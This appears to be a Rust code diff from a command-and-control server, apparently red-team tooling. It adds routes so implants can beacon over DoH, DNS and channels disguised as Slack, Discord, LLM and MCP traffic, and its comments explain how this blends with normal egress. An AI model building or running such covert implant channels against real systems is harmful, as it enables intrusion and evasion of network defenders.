@@ -432,7 +432,26 @@ pub fn router(state: Arc<AppState>) -> Router {
     // BEACON_BODY_LIMIT (512 KiB) is generous. Keeping it well under the API
     // limit bounds the pre-auth buffering an attacker can trigger per /beacon
     // connection (check-in is crypto-gated, not token-gated, by design).
-    let mut beacon_routes = Router::new().route("/beacon", post(beacon));
+    // The native DNS beacon (spec-4) POSTs its frame to `/dns` with an
+    // `application/dns-message` flavor; the body is still exactly one encrypted
+    // frame, so it funnels through the same `beacon` handler as `/beacon`.
+    // External C2 endpoints (spec-6). The implant POSTs the raw encrypted frame
+    // to `/extc2/<service>` instead of the real third-party API (Slack/Discord/
+    // LLM/MCP). In this simplified design the body IS the frame — identical to
+    // `/beacon` — so these routes reuse the beacon handler directly. The
+    // operator-facing relay to the actual provider happens out-of-band.
+    // `/doh` is the DoH-channel beacon endpoint (spec-2). The DoH channel POSTs
+    // the same encrypted frame as `/beacon` but to `/doh` (CS 4.11 DoH Beacon
+    // alignment — blends with DoH egress by URI while reusing the full
+    // crypto/anti-replay/tasking path). Same body, same `beacon` handler.
+    let mut beacon_routes = Router::new()
+        .route("/beacon", post(beacon))
+        .route("/doh", post(beacon))
+        .route("/dns", post(beacon))
+        .route("/extc2/slack", post(beacon))
+        .route("/extc2/discord", post(beacon))
+        .route("/extc2/llm", post(beacon))
+        .route("/extc2/mcp", post(beacon));
     let mut seen = std::collections::HashSet::new();
     for (uri, is_post) in extra {
         if uri.is_empty() || uri == "/beacon" || !seen.insert(uri.clone()) {
